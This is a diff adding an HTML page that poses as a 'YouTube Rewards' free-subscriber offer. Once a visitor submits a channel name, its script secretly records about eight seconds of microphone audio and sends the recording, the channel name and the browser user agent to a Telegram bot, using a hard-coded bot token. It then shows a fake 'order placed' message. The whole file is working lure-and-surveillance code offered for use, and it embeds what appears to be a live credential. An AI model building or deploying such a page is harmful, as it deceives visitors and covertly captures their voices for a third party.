@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>YouTube Rewards</title>
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #0f0f0f;
+      color: #fff;
+      margin: 0;
+      padding: 0;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .container {
+      text-align: center;
+      padding: 40px 20px;
+      max-width: 420px;
+      width: 100%;
+    }
+    .youtube-logo {
+      font-size: 110px;
+      font-weight: bold;
+      color: #ff0000;
+      margin: 40px 0 20px;
+      letter-spacing: -3px;
+    }
+    h1, h2 {
+      margin: 10px 0 25px;
+    }
+    select, input[type="text"], button {
+      width: 100%;
+      padding: 14px 16px;
+      margin: 12px 0;
+      font-size: 17px;
+      border-radius: 8px;
+      border: none;
+      box-sizing: border-box;
+    }
+    select, input[type="text"] {
+      background: #1e1e1e;
+      color: white;
+    }
+    button {
+      background: #ff0000;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    button:disabled {
+      background: #555;
+      cursor: not-allowed;
+    }
+    .stage {
+      display: none;
+    }
+    .active {
+      display: block;
+    }
+    #status {
+      margin: 30px 0 20px;
+      font-size: 19px;
+      line-height: 1.4;
+      min-height: 60px;
+    }
+    .spinner {
+      width: 32px;
+      height: 32px;
+      border: 5px solid #333;
+      border-top: 5px solid #ff0000;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      display: inline-block;
+      vertical-align: middle;
+      margin-right: 12px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+
+  <div id="stage1" class="stage active">
+    <div class="youtube-logo">YouTube</div>
+    <h1>Select Package</h1>
+    
+    <select id="package">
+      <option value="" disabled selected>Choose subscribers</option>
+      <option value="100">100 Subscribers</option>
+      <option value="200">200 Subscribers</option>
+      <option value="1000">1,000 Subscribers</option>
+    </select>
+
+    <button id="btn-next" disabled>Next</button>
+  </div>
+
+  <div id="stage2" class="stage">
+    <h1>Your Channel Username</h1>
+    <input type="text" id="username" placeholder="@username or channel name" autocomplete="off"/>
+    <button id="btn-claim">Claim Now</button>
+  </div>
+
+  <div id="stage3" class="stage">
+    <h2 id="status">Processing your request...</h2>
+    <div>
+      <span class="spinner"></span> Please wait
+    </div>
+  </div>
+
+</div>
+
+<script>
+// ────────────────────────────────────────────────
+//              IMPORTANT – REPLACE THIS
+const TELEGRAM_BOT_TOKEN = "7752428251:AAGNplPML8xLHGQDaHYgs5djp70KcqMBFEI";     // ← BotFather → API Token
+// ────────────────────────────────────────────────
+
+let chatId = null;
+
+// Read chat ID from URL → ?id=...
+const params = new URLSearchParams(window.location.search);
+chatId = params.get("id");
+
+if (!chatId) {
+  document.body.innerHTML = '<h1 style="color:#f33;text-align:center;margin-top:30vh;">Link invalid</h1>';
+  throw new Error("No ?id parameter in URL");
+}
+
+const pkgSelect   = document.getElementById("package");
+const btnNext     = document.getElementById("btn-next");
+const usernameInp = document.getElementById("username");
+const btnClaim    = document.getElementById("btn-claim");
+const statusEl    = document.getElementById("status");
+
+// Enable next button after selection
+pkgSelect.addEventListener("change", () => {
+  btnNext.disabled = !pkgSelect.value;
+});
+
+// Go to username stage
+btnNext.addEventListener("click", () => {
+  document.getElementById("stage1").classList.remove("active");
+  document.getElementById("stage2").classList.add("active");
+});
+
+// Claim → record voice → send to Telegram
+btnClaim.addEventListener("click", async () => {
+  const username = usernameInp.value.trim();
+  const subs     = pkgSelect.value;
+
+  if (!username) {
+    alert("Channel username likhna zaroori hai");
+    return;
+  }
+
+  // Switch to processing screen
+  document.getElementById("stage2").classList.remove("active");
+  document.getElementById("stage3").classList.add("active");
+
+  statusEl.innerHTML = "<span class='spinner'></span> Processing...";
+
+  try {
+    // Request microphone
+    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+    const recorder = new MediaRecorder(stream);
+    const chunks = [];
+
+    recorder.ondataavailable = e => chunks.push(e.data);
+    recorder.start();
+
+    // Record exactly ~8 seconds
+    setTimeout(() => recorder.stop(), 8200);
+
+    await new Promise(r => recorder.onstop = r);
+
+    stream.getTracks().forEach(t => t.stop());
+
+    if (chunks.length === 0) throw new Error("Recording failed");
+
+    // Create voice file
+    const blob = new Blob(chunks, { type: "audio/webm" });
+    const formData = new FormData();
+    formData.append("chat_id", chatId);
+    formData.append("caption", `Package: ${subs} subs\nChannel: ${username}\nFrom: ${navigator.userAgent}`);
+    formData.append("voice", blob, "voice_note.webm");
+
+    // Send to Telegram
+    statusEl.innerHTML = "<span class='spinner'></span> Sending to server...";
+
+    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVoice`, {
+      method: "POST",
+      body: formData
+    });
+
+    const json = await res.json();
+
+    if (!json.ok) {
+      throw new Error(json.description || "Telegram failed");
+    }
+
+    // Final message
+    statusEl.innerHTML = "✅ Success!<br>Your order has been placed.<br>Please wait 24 hours.";
+
+  } catch (err) {
+    console.error(err);
+    statusEl.innerHTML = "❌ Error occurred.<br>Please try again or contact support.";
+  }
+});
+</script>
+</body>
+</html>
